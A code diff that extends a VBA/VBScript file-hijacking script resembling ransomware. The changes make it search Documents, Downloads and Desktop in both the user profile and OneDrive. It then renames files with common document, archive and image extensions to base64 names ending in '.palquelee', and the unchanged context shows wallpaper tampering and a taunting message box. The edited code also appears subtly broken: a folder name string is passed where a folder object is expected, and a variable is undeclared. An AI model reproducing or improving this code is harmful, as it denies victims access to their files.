@@ -1,5 +1,9 @@
 Option Explicit
 
+Private Const EXTENSION = ".palquelee"
+Private Const LISTA_DIRS = "(Documents|Downloads|Desktop)"
+Private Const LISTA_EXTENSIONES = "\.(doc|docx|xls|xlsx|ppt|pptx|csv|msg|eml|pdf|txt|bat|com|zip|rar|7z|jpg|jpeg|png|gif|bmp|svg)$"
+
 Private Const SPI_SETDESKWALLPAPER = 20
 Private Const SPIF_SENDWININICHANGE = &H2
 Private Const SPIF_UPDATEINIFILE = &H1
@@ -50,15 +54,19 @@ MsgBox "Ya valiste wey!"
 End Sub
 
 Function ChangeFiles()
-    Dim objFSO, objFolders, objFolder
-    
+    Dim objFSO, objFolders, objFolder, objEnv, regEx
+    Set regEx = CreateObject("VBScript.RegExp")
+    regEx.Pattern = LISTA_DIRS
+    Set objEnv = Array(Environ("USERPROFILE"), Environ("OneDrive"))
     Set objFSO = CreateObject("Scripting.FileSystemObject")
-    Set objFolders = objFSO.GetFolder(Environ("USERPROFILE")).SubFolders
     
-    For Each objFolder In objFolders
-        If objFolder.Name = "Documents" Or objFolder.Name = "Downloads" Or objFolder.Name = "Desktop" Then
-            InternalLoop objFolder
-        End If
+    For Each o In objEnv
+        Set objFolders = objFSO.GetFolder(o).SubFolders
+        For Each objFolder In objFolders
+            If regEx.Test(objFolder.Name) Then
+                InternalLoop objFolder.Name
+            End If
+        Next
     Next
 
     Set objFSO = Nothing
@@ -71,12 +79,12 @@ Function InternalLoop(mainFolder)
     Dim objFolders, objFolder, objFiles, objFile, RegEx
     
     Set RegEx = CreateObject("VBScript.RegExp")
-    RegEx.Pattern = "\.(doc|docx|xls|xlsx|ppt|pptx|csv|msg|eml|pdf|txt|bat|com|zip|rar|7z|jpg|jpeg|png|gif|bmp)$"
+    RegEx.Pattern = LISTA_EXTENSIONES
     
     Set objFiles = mainFolder.Files
     For Each objFile In objFiles
         If RegEx.Test(objFile.Name) Then
-            objFile.Name = Replace(str_to_base64(objFile.Name), "=", "") & ".palquelee"
+            objFile.Name = Replace(str_to_base64(objFile.Name), "=", "") & EXTENSION
         End If
     Next
     
